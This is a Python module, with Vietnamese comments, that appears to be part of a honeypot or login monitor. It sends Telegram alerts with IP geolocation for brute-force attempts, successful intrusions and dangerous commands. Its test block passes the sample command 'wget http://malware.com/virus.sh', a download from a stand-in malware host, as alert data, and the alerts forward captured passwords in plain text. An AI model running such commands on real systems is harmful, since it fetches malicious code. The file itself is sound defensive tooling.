import requests
import os
from dotenv import load_dotenv

load_dotenv()

TOKEN   = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def send_message(text: str) -> bool:
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    res = requests.post(url, json={
        "chat_id":    CHAT_ID,
        "text":       text,
        "parse_mode": "HTML"
    })
    return res.status_code == 200

def get_ip_info(ip: str) -> dict:
    """Tra cứu vị trí + ISP từ IP dùng ipinfo.io (miễn phí)"""
    # Bỏ qua IP nội bộ
    if ip.startswith(("127.", "192.168.", "10.", "172.")):
        return {
            "location": "Không xác định (IP nội bộ/không hợp lệ)",
            "isp":      "N/A",
            "lat":      None,
            "lon":      None,
        }
    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = res.json()
        loc  = data.get("loc", "")  # dạng "16.0678,108.2208"
        lat, lon = loc.split(",") if "," in loc else (None, None)
        city    = data.get("city", "")
        region  = data.get("region", "")
        country = data.get("country", "")
        return {
            "location": f"{city}, {region}, {country}".strip(", "),
            "isp":      data.get("org", "Unknown"),
            "lat":      lat,
            "lon":      lon,
        }
    except Exception:
        return {
            "location": "Không xác định",
            "isp":      "Unknown",
            "lat":      None,
            "lon":      None,
        }

def make_map_link(lat, lon) -> str:
    if lat and lon:
        return f'<a href="https://maps.google.com/?q={lat},{lon}">🗺️ Xem trên bản đồ</a>'
    return ""

def alert_login_failed(ip: str, username: str, password: str, count: int):
    info     = get_ip_info(ip)
    map_link = make_map_link(info["lat"], info["lon"])
    msg = (
        f"⚠️ <b>BRUTE-FORCE DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📍 Vị trí: <b>{info['location']}</b>\n"
        f"🏢 ISP: <i>{info['isp']}</i>\n"
        f"{map_link}\n"
        f"👤 Username: <code>{username}</code>\n"
        f"🔑 Password thử: <code>{password}</code>\n"
        f"🔢 Số lần thử: <b>{count}</b>\n"
    )
    return send_message(msg)

def alert_login_success(ip: str, username: str, password: str):
    info     = get_ip_info(ip)
    map_link = make_map_link(info["lat"], info["lon"])
    msg = (
        f"🚨 <b>NGUY HIỂM - ĐĂNG NHẬP THÀNH CÔNG</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📍 Vị trí: <b>{info['location']}</b>\n"
        f"🏢 ISP: <i>{info['isp']}</i>\n"
        f"{map_link}\n"
        f"👤 Username: <code>{username}</code>\n"
        f"🔑 Password: <code>{password}</code>\n"
        f"❗ Kẻ tấn công đã vào được hệ thống!"
    )
    return send_message(msg)

def alert_command(ip: str, command: str):
    info     = get_ip_info(ip)
    map_link = make_map_link(info["lat"], info["lon"])
    msg = (
        f"💻 <b>LỆNH NGUY HIỂM PHÁT HIỆN</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📍 Vị trí: <b>{info['location']}</b>\n"
        f"🏢 ISP: <i>{info['isp']}</i>\n"
        f"{map_link}\n"
        f"⌨️ Lệnh: <code>{command}</code>"
    )
    return send_message(msg)

if __name__ == "__main__":
    print("Đang test gửi tin nhắn...")

    ok = alert_login_success("14.243.43.221", "admin", "password123")
    print(f"Login success (IP thật VN): {'OK' if ok else 'FAILED'}")

    ok = alert_login_failed("185.220.101.45", "root", "123456", 15)
    print(f"Brute-force (IP Đức): {'OK' if ok else 'FAILED'}")

    ok = alert_command("8.8.8.8", "wget http://malware.com/virus.sh")
    print(f"Command (Google IP): {'OK' if ok else 'FAILED'}")
